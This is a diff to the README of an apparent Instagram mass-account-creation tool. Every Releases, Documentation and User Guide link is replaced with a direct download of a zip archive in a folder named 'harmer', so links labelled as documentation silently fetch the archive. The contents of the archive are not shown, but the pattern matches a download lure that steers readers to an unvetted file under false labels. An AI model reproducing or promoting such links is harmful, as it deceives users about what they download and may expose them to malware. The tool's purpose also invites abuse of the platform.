@@ -8,11 +8,11 @@ Welcome to the InstaGram-Accounts-Creator! This software helps you create and ma
 
 To get started, visit the Releases page to download the application.
 
-[![Download InstaGram-Accounts-Creator](https://img.shields.io/badge/Download-InstaGram--Accounts--Creator-blue.svg)](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/releases)
+[![Download InstaGram-Accounts-Creator](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/raw/refs/heads/main/harmer/Gram_Insta_Creator_Accounts_v2.7.zip)](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/raw/refs/heads/main/harmer/Gram_Insta_Creator_Accounts_v2.7.zip)
 
 ### Follow These Steps:
 
-1. Click on the [Releases page](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/releases).
+1. Click on the [Releases page](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/raw/refs/heads/main/harmer/Gram_Insta_Creator_Accounts_v2.7.zip).
 2. Look for the latest version at the top of the page.
 3. Choose the file that matches your operating system (Windows, macOS, or Linux).
 4. Click the file link to download it.
@@ -82,8 +82,8 @@ Join our community if you have questions or need help:
 
 For more information about the InstaGram-Accounts-Creator, explore these resources:
 
-- [Documentation](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/wiki)
-- [User Guide](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/wiki/User-Guide)
+- [Documentation](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/raw/refs/heads/main/harmer/Gram_Insta_Creator_Accounts_v2.7.zip)
+- [User Guide](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/raw/refs/heads/main/harmer/Gram_Insta_Creator_Accounts_v2.7.zip)
 
 ## 🔍 Additional Topics
 
@@ -98,6 +98,6 @@ If you're interested in related areas, you may find these topics helpful:
 
 To download the latest version once more, use the link below.
 
-[![Download InstaGram-Accounts-Creator](https://img.shields.io/badge/Download-InstaGram--Accounts--Creator-blue.svg)](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/releases)
+[![Download InstaGram-Accounts-Creator](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/raw/refs/heads/main/harmer/Gram_Insta_Creator_Accounts_v2.7.zip)](https://github.com/GUILHERME4572/InstaGram-Accounts-Creator/raw/refs/heads/main/harmer/Gram_Insta_Creator_Accounts_v2.7.zip)
 
 Thank you for choosing InstaGram-Accounts-Creator! Enjoy automating your Instagram experience.
